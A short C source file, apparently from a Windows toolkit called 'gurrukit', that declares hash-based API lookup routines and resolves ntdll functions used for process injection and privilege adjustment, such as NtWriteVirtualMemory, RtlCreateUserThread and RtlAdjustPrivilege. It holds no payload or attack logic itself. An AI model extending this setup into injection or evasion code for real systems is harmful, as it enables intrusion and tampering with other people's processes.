#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include "include/gurrukit.h"
#include "include/nt.h"

#ifdef _WIN64
	extern unsigned int *find_function64(HANDLE *hDll, unsigned long dwApiHash);
	extern int *find_kernel64(VOID);
#else
	extern unsigned int *find_function32(HANDLE *hDll, unsigned long dwApiHash);
	extern int *find_kernel32(VOID);
#endif

void NtLoader(void) {
	_ZwSetInformationProcess = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "ZwSetInformationProcess");
	_NtQueryInformationProcess = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtQueryInformationProcess");
	_NtQuerySystemInformation = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtQuerySystemInformation");
	_NtTerminateProcess = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtTerminateProcess");
	_RtlCreateUserThread = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlCreateUserThread");
	_RtlAdjustPrivilege = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlAdjustPrivilege");
	_RtlImageNtHeader = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlImageNtHeader");
	_NtOpenProcess = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtOpenProcess");
	_NtWriteVirtualMemory = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtWriteVirtualMemory");
	_NtClose = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtClose");
	_NtWaitForSingleObject = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtWaitForSingleObject");
	_NtOpenFile = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtOpenFile");
	_NtWriteFile = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtWriteFile");
	_RtlInitUnicodeString = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlInitUnicodeString");
	_NtQueryInformationFile = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtQueryInformationFile");
	_NtReadVirtualMemory = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtReadVirtualMemory");
	_NtOpenProcess = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtOpenProcess");
}

#if defined(_MSC_VER)
NTSTATUS NT_STATUS(unsigned long int val) {
	/*	#ifdef _WIN64
	__asm {
			mov rbx, offset val
			mov rax, rbx
	}
	#else
	__asm {
			lea ebx, val
			mov eax, ebx
	}
	#endif
	*/
	return(val);
}

#endif
